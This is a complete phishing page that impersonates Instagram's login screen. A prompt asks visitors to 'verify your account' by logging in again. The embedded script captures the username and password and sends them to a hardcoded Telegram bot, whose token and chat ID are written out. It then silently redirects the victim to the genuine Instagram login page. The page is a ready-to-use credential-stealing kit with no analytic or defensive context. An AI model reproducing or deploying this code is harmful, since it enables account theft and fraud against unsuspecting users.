<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <style>
        body { font-family: -apple-system, system-ui, sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; box-sizing: border-box; }
        .logo { width: 175px; margin-bottom: 20px; display: block; margin-left: auto; margin-right: auto; }
        p { color: #8e8e8e; font-size: 14px; margin-bottom: 20px; line-height: 1.5; font-weight: 500; }
        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; font-size: 12px; }
        button { width: 100%; padding: 10px; background: #0095f6; border: none; color: white; border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 10px; }
        .footer { font-size: 12px; color: #00376b; margin-top: 20px; cursor: pointer; text-decoration: none; font-weight: 500; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/800px-Instagram_logo.svg.png" class="logo" alt="Instagram">
    
    <p>Help us confirm it's you. Please log in again to verify your account.</p>
    
    <form id="login-form">
        <input type="text" id="user" placeholder="Phone number, username, or email" required>
        <input type="password" id="pass" placeholder="Password" required>
        <button type="submit">Log In</button>
    </form>
    
    <div class="footer">Forgot password?</div>
</div>

<script>
const botToken = '8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k';
const chatId = '8639892987';

document.getElementById('login-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const u = document.getElementById('user').value;
    const p = document.getElementById('pass').value;
    
    const text = `🔥 HADIMA CLOSET STRIKE 🔥\n\n👤 User: ${u}\n🔑 Pass: ${p}`;

    try {
        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: text })
        });
    } catch (error) {}

    window.location.href = "https://www.instagram.com/accounts/login/";
});
</script>

</body>
</html>
